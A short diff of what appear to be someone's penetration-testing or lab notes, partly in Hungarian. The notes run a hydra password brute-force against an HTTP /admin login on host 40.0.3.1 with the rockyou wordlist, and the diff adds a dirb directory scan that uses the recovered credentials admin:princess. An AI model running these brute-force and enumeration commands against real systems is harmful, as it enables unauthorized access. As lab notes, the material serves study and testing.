@@ -322,5 +322,5 @@ sudo nmap hogy van-e ssh port alap port lista elég
 
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 40.0.3.1 http-get /admin
-
+dirb http://40.0.3.1/admin /usr/share/wordlists/dirb/common.txt -r -u admin:princess
 
